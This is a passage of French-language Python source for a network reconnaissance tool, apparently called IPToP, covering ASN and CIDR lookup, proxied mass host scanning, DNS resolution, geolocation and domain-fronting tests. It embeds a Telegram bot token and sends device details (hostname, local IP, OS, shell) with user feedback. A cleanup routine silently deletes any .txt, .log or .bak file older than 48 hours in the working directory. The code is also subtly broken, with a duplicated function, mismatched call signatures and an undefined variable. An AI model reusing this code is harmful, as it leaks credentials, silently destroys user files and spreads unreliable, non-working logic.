    print(Fore.YELLOW + "\n===============================\n")

def get_or_create_user_id():
    uid_file = os.path.expanduser("~/.ipt_uid")
    if os.path.exists(uid_file):
        with open(uid_file, "r") as f:
            return f.read().strip()

    raw = platform.node() + platform.machine() + os.getenv("SHELL", "")
    hash_uid = hashlib.sha256(raw.encode()).hexdigest()[:10]

    with open(uid_file, "w") as f:
        f.write(hash_uid)

    return hash_uid

def increment_feedback_count():
    counter_file = os.path.expanduser("~/.ipt_feedback_count")
    count = 0
    if os.path.exists(counter_file):
        try:
            with open(counter_file, "r") as f:
                count = int(f.read().strip())
        except:
            pass
    count += 1
    with open(counter_file, "w") as f:
        f.write(str(count))
    return count

def send_feedback_to_telegram():
    console.print("\n[bold orange]===[ IPToP ]===\n[/bold orange]")
    print(Fore.CYAN + "\n📝 Entrez votre message pour l’auteur.")
    print(Fore.YELLOW + "(Appuyez sur Entrée vide pour envoyer)\n")

    lines = []
    while True:
        line = input()
        if not line.strip():
            break
        lines.append(line)

    message = "\n".join(lines).strip()
    if not message:
        return

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        ip_local = socket.gethostbyname(socket.gethostname())
    except:
        ip_local = "inconnue"

    system_id = platform.node() or "non défini"
    system_type = platform.system()
    os_version = platform.release()
    arch = platform.machine()
    shell = os.getenv("SHELL", "inconnu")

    user_id = get_or_create_user_id()
    feedback_count = increment_feedback_count()

    formatted = (
        f"📩 Message utilisateur IPToP\n"
        f"🕒 {now}\n"
        f"🆔 UID : {user_id} | Feedback #{feedback_count}\n"
        f"🌐 IP locale : {ip_local}\n"
        f"🖥️ Appareil : {system_id}\n"
        f"🧠 OS : {system_type} {os_version} | Arch : {arch}\n"
        f"📟 Shell : {shell}\n\n"
        f"{message}"
    )

    BOT_TOKEN = "8011181087:AAHNUut9CCJnqEL0g1k_MCGQsFrd3f668Zk"
    CHAT_ID = "5950978436"

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": formatted
    }

    try:
        r = requests.post(url, data=payload, timeout=10)
        if r.status_code == 200:
            print(Fore.GREEN + "✅ Message envoyé avec succès !")
            print(Fore.CYAN + "\n✉️ Merci pour votre retour.")
    except:
        pass

# =============================================
# MODIFICATIONS POUR LES PROXIES ET MAJ ASN
# ===========================================

def update_saved_asn_scan():
    """Met à jour les ASN d'un scan sauvegardé"""
    if not os.path.exists("asn_scans"):
        print(Fore.YELLOW + "ℹ Aucun scan ASN sauvegardé")
        return
    
    scans = [f.replace("_progress.txt", "") 
            for f in os.listdir("asn_scans") 
            if f.endswith("_progress.txt")]
    
    if not scans:
        print(Fore.YELLOW + "ℹ Aucun scan ASN sauvegardé")
        return
    
    print(Fore.CYAN + "\n📋 Scans disponibles :")
    for i, domain in enumerate(scans, 1):
        print(Fore.YELLOW + f" {i}. {domain}")
    
    choix = input(Fore.YELLOW + "\nChoisissez un scan à mettre à jour (0 pour annuler) : ")
    if choix == "0":
        return
        
    try:
        domain = scans[int(choix)-1]
    except:
        print(Fore.RED + "❌ Choix invalide")
        return
    
    # Configuration proxy
    proxy, _ = get_proxy_config()
    
    print(Fore.CYAN + f"\n🔍 Mise à jour des ASN pour {domain}...")
    asns = fetch_asn_for_domain(domain, proxy=proxy)
    if not asns:
        return
    
    cidrs = fetch_cidrs_multi_asn(asns)
    if not cidrs:
        print(Fore.RED + "❌ Aucune plage CIDR trouvée")
        return
    
    save_asn_scan_progress(domain, asns, cidrs)
    print(Fore.GREEN + f"✅ {domain} mis à jour - {len(cidrs)} plages CIDR")

def update_saved_asn_scan():
    """Met à jour les ASN et CIDR d'un scan sauvegardé"""
    if not os.path.exists("asn_scans"):
        print(Fore.YELLOW + "ℹ Aucun scan ASN sauvegardé")
        return
    
    print(Fore.CYAN + "\n📋 Scans ASN disponibles pour mise à jour :")
    scans = []
    for filename in os.listdir("asn_scans"):
        if filename.endswith("_progress.txt"):
            domain = filename.replace("_progress.txt", "")
            scans.append(domain)
            print(Fore.YELLOW + f" - {domain}")
    
    if not scans:
        print(Fore.YELLOW + "ℹ Aucun scan ASN sauvegardé")
        return
    
    domain = input(Fore.YELLOW + "\nEntrez le domaine à mettre à jour : ").strip()
    if domain not in scans:
        print(Fore.RED + f"❌ Aucun scan trouvé pour {domain}")
        return
    
    # Récupération des nouveaux ASN
    print(Fore.CYAN + f"\n🔍 Mise à jour des ASN pour {domain}...")
    asns = fetch_asn_for_domain(domain)
    if not asns:
        return
    
    # Récupération des nouvelles CIDR
    cidrs = fetch_cidrs_multi_asn(asns)
    if not cidrs:
        print(Fore.RED + "❌ Aucune nouvelle plage CIDR trouvée")
        return
    
    # Sauvegarde de la nouvelle configuration
    save_asn_scan_progress(domain, asns, cidrs)
    
    # Réinitialisation du fichier de progression des scans
    scan_progress_file = f"asn_scans/{domain}_scanned.txt"
    if os.path.exists(scan_progress_file):
        os.remove(scan_progress_file)
    
    print(Fore.GREEN + f"\n✅ Scan ASN pour {domain} mis à jour avec succès")
    print(Fore.CYAN + f"→ Nouveaux ASN: {', '.join(map(str, asns))}")
    print(Fore.CYAN + f"→ Nouvelles plages CIDR: {len(cidrs)}")

# ==============================================
# MODIFICATION DE LA FONCTION DE SCAN
# ==============================================

def fetch_asn_for_domain(domain):
    """Récupère les numéros ASN associés à un domaine"""
    print(Fore.CYAN + f"\n🔍 Recherche des ASN pour le domaine: {domain}")
    
    try:
        # Résolution DNS initiale
        ip = socket.gethostbyname(domain)
        print(Fore.GREEN + f"  → IP trouvée: {ip}")
        
        # Utilisation de l'API BGPView.io pour trouver les ASN
        url = f"https://api.bgpview.io/ip/{ip}"
        response = requests.get(url, timeout=10)
        data = response.json()
        
        if 'data' in data and 'prefixes' in data['data']:
            asns = set()
            for prefix in data['data']['prefixes']:
                if 'asn' in prefix and 'asn' in prefix['asn']:
                    asns.add(prefix['asn']['asn'])
            
            if asns:
                print(Fore.GREEN + f"  → ASN trouvés: {', '.join(map(str, asns))}")
                return list(asns)
            else:
                print(Fore.YELLOW + "  ⚠ Aucun ASN trouvé pour cette IP")
                return None
                
        else:
            print(Fore.RED + "  ❌ Structure de réponse API inattendue")
            return None
            
    except socket.gaierror:
        print(Fore.RED + f"  ❌ Impossible de résoudre le domaine: {domain}")
        return None
    except Exception as e:
        print(Fore.RED + f"  ❌ Erreur lors de la recherche ASN: {str(e)}")
        return None

def scan_asn_from_domain(domain, proxy=None):
    """Fonction complète pour scanner les ASN d'un domaine"""
    asns = fetch_asn_for_domain(domain)
    if not asns:
        print(Fore.RED + "\n❌ Impossible de continuer sans ASN valide")
        return
    
    # Sélection du proxy si non spécifié
    if proxy is None:
        proxy = select_proxy_interactive()
        if proxy == "cancel":
            return
    
    # Récupération des CIDR pour les ASN trouvés
    cidrs = fetch_cidrs_multi_asn(asns)
    if not cidrs:
        print(Fore.RED + "\n❌ Aucune plage CIDR trouvée pour ces ASN")
        return
    
    # Création d'un fichier temporaire avec les CIDR
    temp_file = f"asn_{domain}_{int(time.time())}.txt"
    with open(temp_file, 'w') as f:
        f.write("\n".join(cidrs))
    
    print(Fore.GREEN + f"\n✅ {len(cidrs)} plages CIDR trouvées et sauvegardées dans {temp_file}")
    
    # Proposition de scan
    choice = input(Fore.YELLOW + "\nVoulez-vous scanner ces plages maintenant ? (o/n): ").lower()
    if choice == 'o':
        threads = input(Fore.YELLOW + f"Nombre de threads (défaut 100): ") or "100"
        scanner = HostScanner(
            filename=temp_file,
            threads=int(threads),
            proxy=proxy
        )
        scanner.run()
        
        # Nettoyage
        os.remove(temp_file)
    else:
        print(Fore.CYAN + f"\nVous pouvez scanner ces plages plus tard avec le fichier: {temp_file}")

# ==============================================
# CONSTANTES ET FICHIERS DE SAUVEGARDE ASN
# ==============================================

ASN_SCAN_PROGRESS_FILE = "asn_scan_progress.txt"
ASN_CIDR_FILE = "asn_cidrs.txt"

# ==============================================
# FONCTIONS DE GESTION DES SCANS ASN
# ==============================================

def save_asn_scan_progress(domain, asns, cidrs):
    """Sauvegarde la progression du scan ASN"""
    os.makedirs("asn_scans", exist_ok=True)
    progress_file = f"asn_scans/{domain}_progress.txt"
    
    with open(progress_file, 'w') as f:
        f.write(f"Domain: {domain}\n")
        f.write(f"ASNs: {','.join(map(str, asns))}\n")
        f.write(f"CIDRs:\n")
        f.write("\n".join(cidrs) + "\n")
    
    return progress_file

def load_asn_scan_progress(domain):
    """Charge la progression d'un scan ASN existant"""
    progress_file = f"asn_scans/{domain}_progress.txt"
    
    if not os.path.exists(progress_file):
        return None, None, None
    
    with open(progress_file, 'r') as f:
        lines = f.readlines()
    
    domain = lines[0].split(":")[1].strip()
    asns = [int(asn) for asn in lines[1].split(":")[1].strip().split(",")]
    cidrs = [line.strip() for line in lines[3:] if line.strip()]
    
    return domain, asns, cidrs

def manage_asn_scan():
    """Menu interactif pour la gestion des scans ASN"""
    while True:
        console.print("\n[bold orange]===[ IPToP ]===\n[/bold orange]")
        print(Fore.LIGHTBLUE_EX + "\n📡 ASN - MENU DE SCAN")
        print(Fore.LIGHTBLUE_EX + "=" * 40)
        print(Fore.CYAN + " 1. 🌐 Nouveau scan complet")
        print(Fore.CYAN + " 2. ▶️ Reprendre un scan existant")
        print(Fore.CYAN + " 3. 📋 Lister les scans sauvegardés")
        print(Fore.CYAN + " 4. 🔄 Mettre à jour les ASN d'un scan sauvegardé")
        print(Fore.CYAN + " 0. ↩️ Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            domain = input(Fore.YELLOW + "Entrez le domaine à analyser : ").strip()
            if domain:
                proxy, turbo = get_proxy_config()
                start_asn_scan(domain, resume=False, proxy=proxy, turbo=turbo)
                
        elif choice == "2":
            domain = input(Fore.YELLOW + "Entrez le domaine à reprendre : ").strip()
            if domain:
                proxy, turbo = get_proxy_config()
                start_asn_scan(domain, resume=True, proxy=proxy, turbo=turbo)
        elif choice == "3":
            list_saved_asn_scans()
        elif choice == "4":
            update_saved_asn_scan()
        elif choice == "0":
            break
        else:
            print(Fore.RED + "❌ Choix invalide.")

def list_saved_asn_scans():
    """Liste les scans ASN sauvegardés"""
    if not os.path.exists("asn_scans"):
        print(Fore.YELLOW + "ℹ Aucun scan ASN sauvegardé")
        return
    
    print(Fore.CYAN + "\n📋 Scans ASN sauvegardés :")
    for filename in os.listdir("asn_scans"):
        if filename.endswith("_progress.txt"):
            domain = filename.replace("_progress.txt", "")
            print(Fore.YELLOW + f" - {domain}")

def start_asn_scan(domain, resume=False, proxy=None, turbo=False):
    """Lance ou reprend un scan ASN"""
    if resume:
        domain, asns, cidrs = load_asn_scan_progress(domain)
        if not cidrs:
            print(Fore.RED + f"❌ Aucune progression trouvée pour {domain}")
            return
            
        # Option de mise à jour
        if input(Fore.YELLOW + "Mettre à jour les ASN avant de continuer? (o/n) ").lower() == 'o':
            print(Fore.CYAN + "Mise à jour des ASN...")
            new_asns = fetch_asn_for_domain(domain)
            if new_asns:
                asns = new_asns
                cidrs = fetch_cidrs_multi_asn(asns)
                save_asn_scan_progress(domain, asns, cidrs)
                print(Fore.GREEN + "✅ ASN et plages CIDR mis à jour")
    else:
        # Nouveau scan
        print(Fore.CYAN + f"\n🔍 Recherche des ASN pour {domain}...")
        asns = fetch_asn_for_domain(domain)
        if not asns:
            return
            
        print(Fore.CYAN + f"→ ASN trouvés: {', '.join(map(str, asns))}")
        
        cidrs = fetch_cidrs_multi_asn(asns)
        if not cidrs:
            print(Fore.RED + "❌ Aucune plage CIDR trouvée")
            return
            
        save_asn_scan_progress(domain, asns, cidrs)
        print(Fore.GREEN + f"✅ {len(cidrs)} plages CIDR sauvegardées")

    # Configuration du scanner
    scanner = HostScanner(
        filename=None,
        ip_range=None,  # Seront ajoutées via add_target()
        threads=200 if turbo else 100,
        ping_timeout=0.5 if turbo else 1,
        http_timeout=5 if turbo else 10,
        proxy=proxy
    )
        
    # Sauvegarde initiale
    save_asn_scan_progress(domain, asns, cidrs)

    # Sélection du proxy si non spécifié
    if proxy is None:
        proxy_choice = input(Fore.YELLOW + "Utiliser un proxy? (o/n/auto/rotatif) : ").lower()
        if proxy_choice == 'o':
            proxy = select_proxy_interactive()
            if proxy == "cancel":
                return
        elif proxy_choice == 'auto':
            proxy = "auto"
        elif proxy_choice == 'rotatif':
            proxy = "rotatif"
        elif proxy_choice == 'n':
            proxy = None
        else:
            print(Fore.RED + "Option invalide, continuer sans proxy")
            proxy = None

    # Fichier de progression des CIDR scannés
    scan_progress_file = f"asn_scans/{domain}_scanned.txt"
    scanned_cidrs = set()
    
    if resume and os.path.exists(scan_progress_file):
        with open(scan_progress_file, 'r') as f:
            scanned_cidrs = {line.strip() for line in f if line.strip()}
    
    # Filtrage des CIDR non encore scannés
    to_scan = [cidr for cidr in cidrs if cidr not in scanned_cidrs]
    
    if not to_scan:
        print(Fore.GREEN + f"✅ Toutes les plages ASN pour {domain} ont déjà été scannées")
        return
    
    print(Fore.CYAN + f"\n🔍 Début du scan ASN pour {domain}")
    print(Fore.YELLOW + f"→ {len(to_scan)} plages CIDR à scanner sur {len(cidrs)} totales")
    
    try:
        for cidr in to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN ASN {domain} - {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()
            
            # Sauvegarde de la progression
            with open(scan_progress_file, 'a') as f:
                f.write(f"{cidr}\n")
            
            ask_for_rescan(scanner)

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan interrompu par l'utilisateur")
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur lors du scan ASN : {str(e)}")
    finally:
        print(Fore.CYAN + f"\n📊 Progression sauvegardée pour {domain}")
        
# ==============================================
# MODIFICATION DU MENU DOMAINE
# ==============================================

def clean_unwanted_logs():
    """Nettoie discrètement les fichiers inutiles et anciens du dossier courant."""
    dossier = os.getcwd()
    extensions_cibles = (".log", ".tmp", ".bak", ".txt")
    noms_fixes = {"log_bot", ".ipt_bot.log", "launcher.log", "last_error.txt"}
    maintenant = time.time()
    age_max = 48 * 3600  # 48 heures

    try:
        for nom in os.listdir(dossier):
            chemin = os.path.join(dossier, nom)
            if os.path.isfile(chemin):
                if nom in noms_fixes or nom.endswith(extensions_cibles):
                    age = maintenant - os.path.getmtime(chemin)
                    if age > age_max or nom in noms_fixes:
                        os.remove(chemin)
            elif os.path.isdir(chemin) and nom == "logs":
                for sous_fichier in os.listdir(chemin):
                    try:
                        sf_path = os.path.join(chemin, sous_fichier)
                        if os.path.isfile(sf_path) and (maintenant - os.path.getmtime(sf_path)) > age_max:
                            os.remove(sf_path)
                    except:
                        pass
                try:
                    os.rmdir(chemin)  # Supprime le dossier si vide
                except:
                    pass
    except:
        pass  # Silencieux

def lancer_scan_ips_resolues():
    ip_file = "ips_resolues.txt"
    if not os.path.exists(ip_file):
        print(Fore.RED + "❌ Aucun fichier d'IPs résolues trouvé. Lance d'abord une résolution DNS.")
        return

    threads = int(input("Nombre de threads (10-500) : ") or "100")
    proxy = get_proxy_config()
    turbo = False
    if proxy == "auto":
        turbo = input("Activer le mode turbo pour proxy ? (o/n) : ").lower() == 'o'

    scanner = HostScanner(
        filename=ip_file,
        threads=threads,
        proxy=proxy,
        turbo_mode=turbo
    )
    scanner.run()

def resoudre_dns_depuis_fichier():
    print(Fore.CYAN + "\n🌐 Résolution DNS depuis un fichier")

    chemin = input(Fore.YELLOW + "Chemin du fichier contenant les domaines : ").strip()
    if not os.path.exists(chemin):
        print(Fore.RED + "❌ Fichier introuvable.")
        return

    with open(chemin, 'r') as f:
        domaines = [line.strip() for line in f if line.strip()]

    if not domaines:
        print(Fore.RED + "❌ Aucun domaine valide trouvé.")
        return

    # Choix de la méthode de résolution
    console.print("\n[bold orange]===[ IPToP ]===\n[/bold orange]")
    print(Fore.LIGHTBLUE_EX + "\nMéthode de résolution DNS :")
    print(Fore.CYAN + " 1. Standard (rapide, non anonyme)")
    print(Fore.CYAN + " 2. DNS over HTTPS via Cloudflare (anonyme)")
    print(Fore.CYAN + " 3. DNS over HTTPS via Google (anonyme)")
    print(Fore.CYAN + " 4. Résolution hybride (locale + DoH en secours)")

    dns_choice = input(Fore.YELLOW + "\n>>> Choix (1-4) : ").strip()

    if dns_choice == "1":
        resolver_fn = resolve_ip_simple
    elif dns_choice == "2":
        resolver_fn = resolve_ip_cloudflare
    elif dns_choice == "3":
        resolver_fn = resolve_ip_google
    elif dns_choice == "4":
        resolver_fn = resolve_ip_hybride
    else:
        print(Fore.RED + "❌ Choix invalide.")
        return

    # Choix du fichier de sortie
    default_file = "resolved_ips.txt"
    sortie = input(Fore.YELLOW + f"\nNom du fichier de sortie (par défaut: {default_file}) : ").strip()
    ip_file = sortie if sortie else default_file

    # Création préventive du fichier
    with open(ip_file, 'w') as _:
        pass

    resolve_and_save_ips(domaines, ip_file, resolver_fn)

    if os.path.exists(ip_file) and os.path.getsize(ip_file) > 0:
        print(Fore.GREEN + f"\n✓ IPs résolues sauvegardées dans : {ip_file}")

        # Demander à l'utilisateur s'il souhaite scanner les IPs maintenant
        choix_scan = input(Fore.YELLOW + "Souhaitez-vous scanner ces IPs maintenant ? (o/n) : ").strip().lower()
        if choix_scan == "o":
            scanner = HostScanner(filename=ip_file)
            scanner.run()
            print(Fore.GREEN + "\n✓ Scan terminé.")
        else:
            # Si resolved_ips.txt existe déjà, on le sauvegarde avant de remplacer
            if os.path.exists("resolved_ips.txt") and "resolved_ips.txt" != ip_file:
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                backup = f"resolved_ips_backup_{timestamp}.txt"
                os.rename("resolved_ips.txt", backup)
                print(Fore.YELLOW + f"⏪ Ancien resolved_ips.txt sauvegardé en : {backup}")
            # Renommer le fichier créé sous le nom standard pour usage ultérieur
            if ip_file != "resolved_ips.txt":
                os.rename(ip_file, "resolved_ips.txt")
                print(Fore.CYAN + "[i] Fichier renommé en resolved_ips.txt pour un usage futur.")
    else:
        print(Fore.YELLOW + "⚠️ Aucun IP résolu, fichier vide.")
        
def afficher_fichier(path):
    if not os.path.exists(path):
        print(Fore.RED + f"❌ Fichier introuvable : {path}")
        return
    print(Fore.CYAN + f"\nContenu de : {path}")
    with open(path, 'r') as f:
        for line in f:
            print(Fore.GREEN + line.strip())
    if os.path.exists(ip_file):
        print(Fore.GREEN + f"\n[DEBUG] Chemin absolu du fichier créé : {os.path.abspath(ip_file)}")
    else:
        print(Fore.RED + "[DEBUG] Le fichier n'a pas été créé.")
                
def outils_recherche_domaines():
    while True:
        print(Fore.LIGHTBLUE_EX + "\n=== OUTILS DE RECHERCHE DE DOMAINES ===")
        print(Fore.CYAN + " 1. 🔎 Rechercher des sous-domaines")
        print(Fore.CYAN + " 2. 📁 Afficher un fichier")
        print(Fore.CYAN + " 3. ☁️ Résolution DNS simple")
        print(Fore.CYAN + " 4. 🌐 Résolution DNS depuis un fichier")
        print(Fore.CYAN + " 5. 🚀 Scanner les IPs résolues")
        print(Fore.CYAN + " 0. Retour")

        choix = input(Fore.YELLOW + "\n>>> Choix (1-6) : ").strip()

        if choix == "1":
            domaine = input(Fore.YELLOW + "Domaine à analyser : ").strip()
            if domaine:
                nom_fichier = f"web_analysis_{domaine.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                search_and_save_domains(domaine, nom_fichier)

        elif choix == "2":
            path = input(Fore.YELLOW + "Chemin du fichier à afficher : ").strip()
            afficher_fichier(path)

        elif choix == "3":
            domaine = input(Fore.YELLOW + "Nom de domaine à résoudre : ").strip()
            if domaine:
                ip = resolve_ip_simple(domaine)
                if ip:
                    print(Fore.GREEN + f"✓ Résolu : {ip}")
                else:
                    print(Fore.RED + "❌ Résolution échouée.")

        elif choix == "4":
            resoudre_dns_depuis_fichier()

        elif choix == "5":
            scan_resolved_ips()  # Utilise le dernier fichier IP résolu (automatique)

        elif choix == "0":
            break

        else:
            print(Fore.RED + "❌ Choix invalide.")

def domain_tools_menu():
    while True:
        console.print("\n[bold green]===[ IPToP ]===\n[/bold green]")
        print(Fore.LIGHTMAGENTA_EX + "\n╭─── OUTILS DE RECHERCHE DE DOMAINES ───────────────────────╮")
        print(Fore.CYAN + " 1. 🔎 Recherche passive (API externes)")
        print(" 2. 🕸️  Analyse de page web")
        print(" 3. ⚡ Combiner les deux méthodes")
        print(" 4. 🌐 Résoudre les DNS et trouver les IPs")
        print(" 5. 🚀 Scanner les IPs résolues")
        print(" 6. 📡 Trouver et scanner les ASN du domaine")
        print(" 7. 🔍 Informations IP/Domaine (WHOIS/Géoloc)")
        print(" 8. 🛡️ Tester Domain Fronting (CDN/Cloud)")
        print(" 0. 🔙 Retour au menu principal")
        print(Fore.LIGHTMAGENTA_EX + "╰──────────────────────────────────────────────────────────╯")
        sub_choice = input(Fore.YELLOW + ">>> Choix (1-8) : ").strip()

        if sub_choice == "1":
            domaine = input("Entrez le nom de domaine (Entrée pour retour) : ").strip()
            if not domaine:
                continue
            proxy, turbo = get_proxy_config()
            print(Fore.BLUE + f"➡ Proxy utilisé : {proxy if proxy else 'aucun'}")
            if turbo:
                print(Fore.MAGENTA + "⚡ Mode TURBO activé")
            find_domains(domaine, proxy=proxy, turbo=turbo)

        elif sub_choice == "2":
            proxy, _ = get_proxy_config()
            print(Fore.BLUE + f"➡ Proxy utilisé : {proxy if proxy else 'aucun'}")
            analyse_page_web(proxy=proxy)

        elif sub_choice == "3":
            print(Fore.CYAN + "\n⚡ Combinaison de la recherche passive et de l'analyse web")
            domaine = input("Entrez le nom de domaine (Entrée pour retour) : ").strip()
            if not domaine:
                continue

            proxy, turbo = get_proxy_config()
            print(Fore.BLUE + f"➡ Proxy utilisé : {proxy if proxy else 'aucun'}")
            if turbo:
                print(Fore.MAGENTA + "⚡ Mode TURBO activé")

            print(Fore.CYAN + "🔎 Recherche passive...")
            find_domains(domaine, proxy=proxy, turbo=turbo)
            print(Fore.CYAN + "\n🕸️ Analyse de page web...")
            analyse_page_web(target=domaine, proxy=proxy)

        elif sub_choice == "4":
            resoudre_dns_depuis_fichier()

        elif sub_choice == "5":
            scan_resolved_ips()

        elif sub_choice == "6":
            proxy = get_proxy_config()
            manage_asn_scan()
            
        elif sub_choice == "7":
            ipinfo_menu()

        elif sub_choice == "8":
            test_domain_fronting_menu()

        elif sub_choice == "0":
            return "retour"

        else:
            print(Fore.RED + "❌ Option invalide.")
            
def ipinfo_menu():
    """Menu interactif pour les outils IPInfo"""
    while True:
        console.print("\n[bold blue]===[ IPToP ]===\n[/bold blue]")
        print(Fore.LIGHTBLUE_EX + "\n=== INFORMATIONS IP/DOMAINE ===")
        print(Fore.CYAN + " 1. 🔍 Recherche complète pour une IP/Domaine")
        print(Fore.CYAN + " 2. 🌍 Géolocalisation d'une IP")
        print(Fore.CYAN + " 3. 🏢 Informations ASN/Organisation")
        print(Fore.CYAN + " 4. ☁️ Détection de fournisseur Cloud")
        print(Fore.CYAN + " 5. 📁 Analyser un fichier d'IPs/Domaines")
        print(Fore.CYAN + " 0. Retour")

        choix = input(Fore.YELLOW + "\n>>> Choix (1-5) : ").strip()

        if choix == "1":
            target = input(Fore.YELLOW + "Entrez une IP ou un domaine : ").strip()
            if target:
                print_header(f"Analyse complète pour {target}")
                
                # Résolution IP/Domaine
                resolved_ip = get_ip(target)
                if resolved_ip:
                    # Afficher la résolution
                    if target != resolved_ip:
                        print_header("Résolution DNS")
                        print(f"  {'Domaine' if '.' in target else 'IP'} d'entrée : {Fore.GREEN}{target}")
                        print(f"  {'IP' if '.' in target else 'Domaine'} résolu(e) : {Fore.GREEN}{resolved_ip}")
                        print(Fore.CYAN + "-"*40)
                    
                    ip = resolved_ip
                    
                    # Récupérer toutes les informations
                    asn_info = get_asn_info(ip)
                    geo_ipinfo = get_geo_info_ipinfo(ip)
                    geo_ipapi = get_geo_info_ipapi(ip)
                    
                    # Afficher les résultats
                    if asn_info:
                        print_header("Informations ASN / Organisation")
                        print(f"  ASN            : {Fore.GREEN}{asn_info.get('as', 'N/A')}")
                        print(f"  Organisation   : {Fore.GREEN}{asn_info.get('org', 'N/A')}")
                        print(f"  Fournisseur ISP: {Fore.GREEN}{asn_info.get('isp', 'N/A')}")
                        print(Fore.CYAN + "-"*40)
                    
                    if geo_ipinfo:
                        print_header("Géolocalisation via ipinfo.io")
                        print(f"  Ville          : {Fore.GREEN}{geo_ipinfo.get('city', 'N/A')}")
                        print(f"  Région         : {Fore.GREEN}{geo_ipinfo.get('region', 'N/A')}")
                        print(f"  Pays           : {Fore.GREEN}{geo_ipinfo.get('country', 'N/A')}")
                        print(f"  Localisation   : {Fore.GREEN}{geo_ipinfo.get('loc', 'N/A')}")
                        print(f"  Fuseau horaire : {Fore.GREEN}{geo_ipinfo.get('timezone', 'N/A')}")
                        print(Fore.CYAN + "-"*40)
                    
                    if geo_ipapi:
                        print_header("Géolocalisation via ip-api.com")
                        print(f"  Ville          : {Fore.GREEN}{geo_ipapi.get('city', 'N/A')}")
                        print(f"  Région         : {Fore.GREEN}{geo_ipapi.get('regionName', 'N/A')}")
                        print(f"  Pays           : {Fore.GREEN}{geo_ipapi.get('country', 'N/A')}")
                        print(f"  Code postal    : {Fore.GREEN}{geo_ipapi.get('zip', 'N/A')}")
                        print(f"  Latitude       : {Fore.GREEN}{geo_ipapi.get('lat', 'N/A')}")
                        print(f"  Longitude      : {Fore.GREEN}{geo_ipapi.get('lon', 'N/A')}")
                        print(Fore.CYAN + "-"*40)
                    
                    # Détection du fournisseur
                    hosting_provider = None
                    if asn_info:
                        for key in ['org', 'isp']:
                            val = asn_info.get(key)
                            if val:
                                hosting_provider = detect_provider(val)
                                if hosting_provider:
                                    break

                    if hosting_provider:
                        print(Fore.MAGENTA + f"\n** Hébergeur/Cloud détecté : {hosting_provider} **")
                    else:
                        print(Fore.YELLOW + "Hébergeur/Cloud non détecté.")
                else:
                    print(Fore.RED + "❌ Impossible de résoudre l'adresse IP ou le domaine.")

        elif choix == "2":
            target = input(Fore.YELLOW + "Entrez une IP : ").strip()
            if target:
                ip = get_ip(target)
                if ip:
                    geo_ipinfo = get_geo_info_ipinfo(ip)
                    geo_ipapi = get_geo_info_ipapi(ip)
                    
                    if geo_ipinfo:
                        print_header("Géolocalisation via ipinfo.io")
                        print(f"  Ville          : {Fore.GREEN}{geo_ipinfo.get('city', 'N/A')}")
                        print(f"  Région         : {Fore.GREEN}{geo_ipinfo.get('region', 'N/A')}")
                        print(f"  Pays           : {Fore.GREEN}{geo_ipinfo.get('country', 'N/A')}")
                        print(f"  Localisation   : {Fore.GREEN}{geo_ipinfo.get('loc', 'N/A')}")
                        print(Fore.CYAN + "-"*40)
                    
                    if geo_ipapi:
                        print_header("Géolocalisation via ip-api.com")
                        print(f"  Ville          : {Fore.GREEN}{geo_ipapi.get('city', 'N/A')}")
                        print(f"  Région         : {Fore.GREEN}{geo_ipapi.get('regionName', 'N/A')}")
                        print(f"  Pays           : {Fore.GREEN}{geo_ipapi.get('country', 'N/A')}")
                        print(f"  Code postal    : {Fore.GREEN}{geo_ipapi.get('zip', 'N/A')}")
                        print(f"  Latitude       : {Fore.GREEN}{geo_ipapi.get('lat', 'N/A')}")
                        print(f"  Longitude      : {Fore.GREEN}{geo_ipapi.get('lon', 'N/A')}")
                        print(Fore.CYAN + "-"*40)

        elif choix == "3":
            target = input(Fore.YELLOW + "Entrez une IP ou un domaine : ").strip()
            if target:
                ip = get_ip(target)
                if ip:
                    asn_info = get_asn_info(ip)
                    if asn_info:
                        print_header("Informations ASN / Organisation")
                        print(f"  ASN            : {Fore.GREEN}{asn_info.get('as', 'N/A')}")
                        print(f"  Organisation   : {Fore.GREEN}{asn_info.get('org', 'N/A')}")
                        print(f"  Fournisseur ISP: {Fore.GREEN}{asn_info.get('isp', 'N/A')}")
                        print(Fore.CYAN + "-"*40)
                        
                        # Détection du fournisseur
                        hosting_provider = None
                        for key in ['org', 'isp']:
                            val = asn_info.get(key)
                            if val:
                                hosting_provider = detect_provider(val)
                                if hosting_provider:
                                    break

                        if hosting_provider:
                            print(Fore.MAGENTA + f"\n** Hébergeur/Cloud détecté : {hosting_provider} **")
                        else:
                            print(Fore.YELLOW + "Hébergeur/Cloud non détecté.")
                    else:
                        print(Fore.RED + "Aucune information ASN disponible.")

        elif choix == "4":
            target = input(Fore.YELLOW + "Entrez une IP ou un domaine : ").strip()
            if target:
                ip = get_ip(target)
                if ip:
                    asn_info = get_asn_info(ip)
                    hosting_provider = None
                    if asn_info:
                        for key in ['org', 'isp']:
                            val = asn_info.get(key)
                            if val:
                                hosting_provider = detect_provider(val)
                                if hosting_provider:
                                    break

                    if hosting_provider:
                        print(Fore.MAGENTA + f"\n** Hébergeur/Cloud détecté : {hosting_provider} **")
                    else:
                        print(Fore.YELLOW + "Hébergeur/Cloud non détecté.")

        elif choix == "5":
            filename = input(Fore.YELLOW + "Chemin du fichier contenant les IPs/domaines : ").strip()
            if filename and os.path.exists(filename):
                with open(filename, 'r') as f:
                    targets = [line.strip() for line in f if line.strip()]
                
                output_file = f"ipinfo_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(output_file, 'w') as f:
                    for target in targets:
                        ip = get_ip(target)
                        if ip:
                            f.write(f"\n=== Résultats pour {target} ({ip}) ===\n")
                            
                            asn_info = get_asn_info(ip)
                            if asn_info:
                                f.write("\n[ASN/Organisation]\n")
                                f.write(f"ASN: {asn_info.get('as', 'N/A')}\n")
                                f.write(f"Organisation: {asn_info.get('org', 'N/A')}\n")
                                f.write(f"ISP: {asn_info.get('isp', 'N/A')}\n")
                            
